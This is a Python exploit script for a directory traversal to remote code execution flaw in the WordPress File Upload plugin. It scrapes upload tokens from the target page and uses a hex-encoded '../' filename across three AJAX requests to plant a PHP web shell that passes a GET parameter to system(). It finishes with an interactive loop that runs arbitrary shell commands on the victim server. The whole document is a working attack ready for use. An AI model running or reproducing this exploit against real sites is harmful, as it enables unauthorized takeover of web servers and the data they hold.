#!/usr/bin/python
### Exploit author: Riccardo Krauter (p4w)
### Vulnerability discoverer: Riccardo Krauter (p4w)
### Twitter: @p4w16
### mail: riccardo.krauter@gmail.com

import requests
import sys
import time
from urlparse import urlparse

def print_menu():
    text = """##################################################################"""
    print(text)
    time.sleep(0.1)
    text = """#                                                                #"""
    print(text)
    time.sleep(0.1)
    text = """#                      CVE-2020-xxxx                             #"""
    print(text)
    time.sleep(0.1)
    text = """#   Directory travrsal to RCE on WordPress File Upload plugin    #"""
    print(text)
    time.sleep(0.1)
    text = """#   Exploit author: Riccardo Krauter (p4w)                       #"""
    print(text)
    time.sleep(0.1)
    text = """#   Vulnerability discoverer: Riccardo Krauter (p4w)             #"""
    print(text)
    time.sleep(0.1)
    text = """#   Twitter: https://twitter.com/p4w16                           #"""
    print(text)
    time.sleep(0.1)
    text = """#                                                                #"""
    print(text)
    time.sleep(0.1)
    text = """##################################################################"""
    print(text)
    print("")


DEBUG = True#False#
print_menu()
if len(sys.argv) != 3:
    print("[*] Usage: python <url-and-path-to-a-page-including-the-upload-form> <wp-basedir>")
    exit()
else:
    url = sys.argv[1]
    p_url = urlparse(url)
    admin_ajax_url = p_url[0] + '://' + p_url[1]  + sys.argv[2] + "/wp-admin/admin-ajax.php"
    print("[+] admin-ajax.php: " + admin_ajax_url)

resp = requests.get(admin_ajax_url)
if resp.status_code == 400:
    print("[+] admin-ajax.php should be fine, keep testing")

page = requests.get(url)
cookie = page.cookies
print("[+] Plugin url: " + url)
filename = "RcE-for-Th3-WiN.txt" ### you can also use jpg, png, etc...
payload = "../plugins/wp-file-upload/lib/" + filename
print("[+] Using payload: " + payload)
payload = payload.encode("hex")
nonce = ''
params_index = ''
session_token = ''

if 'wfu_uploader_nonce"' in page.text:
    idx = page.text.find('wfu_uploader_nonce" value="') + len('wfu_uploader_nonce" value="')
    nonce = page.text[idx:idx+20].split('"')[0]
    print("[+] Retrived nonce parameter: " + nonce)

if 'params_index:"' in page.text:
    idx = page.text.find('params_index:"') + len('params_index:"')
    params_index = page.text[idx:idx+30].split('"')[0]
    print("[+] Retrived params_index parameter: " + params_index)

if 'session:"' in  page.text:
    idx = page.text.find('session:"') + len('session:"')
    session_token = page.text[idx:idx+65].split('"')[0]
    print("[+] Retrived session_token parameter: " + session_token)



php_code = """<?php
if (isset($_GET['guess_me_if_u_can'])) {
    echo "<canary-tag>";
    system($_GET['guess_me_if_u_can']);
    echo "</canary-tag>";
}
?>"""
fsize = str(len(php_code))

### stage 1 ###
d = {
    "action":"wfu_ajax_action_ask_server", "session_token":session_token,
    "sid":"1", "unique_id":"KpNKThIx0T", "wfu_uploader_nonce":nonce,
    "filenames":payload, "filesizes":fsize
 }

resp = requests.post(admin_ajax_url, data=d, cookies=cookie)
if "wfu_askserver_success" in resp.text:
    print("[+] Stage 1 success :)")
else:
    print("[-] Something went wrong :/")
    if DEBUG == True:
        print(resp.text)
    exit()

### stage 2 ###
params = {
 "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"),
 "uploadedfile_1_index":(None,"0"), "uploadedfile_1_size":(None,fsize),
 "subdir_sel_index":(None,"-1"), "nofileupload_1":(None,"0"), "only_check":(None,"1"),
 "session_token":(None,session_token), "uploadedfile_1_name": (None,payload),
 "params_index":(None,params_index), "uniqueuploadid_1":(None,"KpNKThIx0T")
 }
resp = requests.post(admin_ajax_url, files=params, cookies=cookie)

if "wfu_fileupload_success" in resp.text:
    print("[+] Stage 2 work fine :)")
else:
    print("[-] Something went wrong :/")
    if DEBUG == True:
        print(resp.text)
    exit()

### stage 3 ###
params = {
 "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"),
 "uploadedfile_1_index":(None,"0"), "uploadedfile_1_size":(None,fsize),
 "subdir_sel_index":(None,"-1"), "nofileupload_1":(None,"0"), "only_check":(None,"0"),
 "session_token":(None,session_token), "uploadedfile_1_name": (None,payload),
 "params_index":(None,params_index), "uniqueuploadid_1":(None,"KpNKThIx0T"),
 "uploadedfile_1":php_code
 }

resp = requests.post(admin_ajax_url, files=params, cookies=cookie)

if "wfu_fileupload_success" in resp.text:
    print("[+] Stage 3 work prefectly :)")
    print("[+] We should have our webshell, gonna check it!")
else:
    print("[-] Something went wrong :/")
    if DEBUG == True:
        print(resp.text)
    exit()

### enjoy the ownage ###
cmd = "whoami"
resp = requests.get(url + "?guess_me_if_u_can=" + cmd)
resp = resp.text.split("<canary-tag>")[1]
resp = resp.split("</canary-tag>")[0]
print(resp)
while True:
    cmd = raw_input("$ ")
    if cmd == "exit":
        print("bye bye!")
        exit()
    resp = requests.get(url + "?guess_me_if_u_can=" + cmd)
    resp = resp.text.split("<canary-tag>")[1]
    resp = resp.split("</canary-tag>")[0]
    print(resp)
